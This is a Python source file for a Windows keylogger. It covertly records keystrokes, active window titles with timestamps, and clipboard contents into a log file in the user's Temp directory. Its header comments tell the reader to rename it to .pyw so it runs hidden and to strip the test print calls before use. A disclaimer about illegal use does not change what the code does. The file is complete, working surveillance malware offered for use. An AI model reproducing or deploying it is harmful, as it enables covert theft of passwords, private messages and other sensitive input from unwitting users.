###################################################################################
# ALL print() IS JUST FOR TESTING
# BEFORE STARTING SCRIPT YOU NEED TO COMMENT ALL print()
# RENAME FILE IN .pyw FOR RUN THIS SCRIPT IN HIDE MODE
# THIS SCRIPT IS TESTED ON WINDOWS 10
# IMPORTANT: I don't take any responsibility for the illegal use of this program
# Don't be a lamer
###################################################################################
# -*- coding: utf-8 -*-

from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
import os
import re
import threading
import time
import sys
import shutil
import random
import pyperclip

# Local Keylogger

# GET INFO ---------------------------------------------------------------------------------------------------------------------------
username = os.getlogin() # Getting username from user
target = os.environ['COMPUTERNAME'] # Getting hostname from user
dirFile = os.path.dirname(os.path.abspath(__file__)) + "\\" # Workink directory
nameFile = os.path.basename(__file__) # Getting only the name of keylistener
keylog = "C:\\Users\\"+username+"\\AppData\\Local\\Temp\\Logs.log"

# keylistener --------------------------------------------------------------------------------------------------------------------------
lastFocusName = ""
def keylistener():    
    def clipboard(): # when the user press ctrl+v
        # get clipboard data
        try:
            data = pyperclip.paste()
            # write into the logfile
            clip_write = open(keylog, "a")
            clip_write.write(" <clipboard["+data+"]> ")
            clip_write.close()
            data = ""
        except Exception as cliperr:
            print(cliperr)
            pass

    def on_press(key):
        global lastFocusName
        if lastFocusName != GetWindowText(GetForegroundWindow()): # grabbing the title name of a window if it changed
            try:
                windowsTitleName = open(keylog, "a")
                windowsTitleName.write("\n\n" + str(time.strftime("%Y-%m-%d %H:%M:%S") + " | " + GetWindowText(GetForegroundWindow()) + "\n"))
                windowsTitleName.close()
            except:
                pass

        lastFocusName = GetWindowText(GetForegroundWindow()) # current title name window

        if key == Key.shift_r or key == Key.shift_l or key == Key.ctrl_l: # removing form output the key SHIFT and CTRL(left)
            return None

        if str(key) == "'\\x19'": # if user press CTRL+Y the scritp will close, delete this strings for don't close script
            print("Quitting...")
            return False
        
        if str(key).startswith("Key."): # assign at all key the output <key>
            key = "<%s>" % (str(key))

        if str(key) == "<Key.backspace>":
            key = "<BS>"

        if str(key) == "<Key.space>":
            key = " "
            
        if str(key) == "<Key.enter>":
            key = "\n"

        if str(key) == "'\\x16'":
            key = ""
            clipboard()
        
        # CTRL + keys -----------------------------------------------------------------------------------------------------------------
        if str(key) == "'\\x01'":
            key = "<CTRL+A>"
        
        if str(key) == "'\\x13'":
            key = "<CTRL+S>"

        if str(key) == "'\\x1a'":
            key = "<CTRL+Z>"

        if str(key) == "'\\x18'":
            key = "<CTRL+X>"

        if str(key) == "'\\x03'":
            key = "<CTRL+C>"

        if str(key) == "'\\x0e'":
            key = "<CTRL+N>"
        
        if str(key) == "'\\x14'":
            key = "<CTRL+T>" 
        
        if str(key) == "'\\x10'":
            key = "<CTRL+P>"
        
        if str(key) == "'\\x0c'":
            key = "<CTRL+L>"      
        # CTRL + keys -----------------------------------------------------------------------------------------------------------------

        output = str(key).replace("'", "") # if u need to view the output without ' "" ' create a python script to replace all ' "" ' with " ' "
        log = open(keylog, "a")
        log.write(output)
        log.close() # close output file for listening if the key backspace is pressed for delete last char
        
    with Listener(on_press=on_press) as listener:
        listener.join()
# keylistener --------------------------------------------------------------------------------------------------------------------------
print("Capturing Keystrokes")
print("Logs are here > " + keylog)
print("Press [CTRL+Y] for interrupt the keylogger")
keylistener() # Running the keylistener
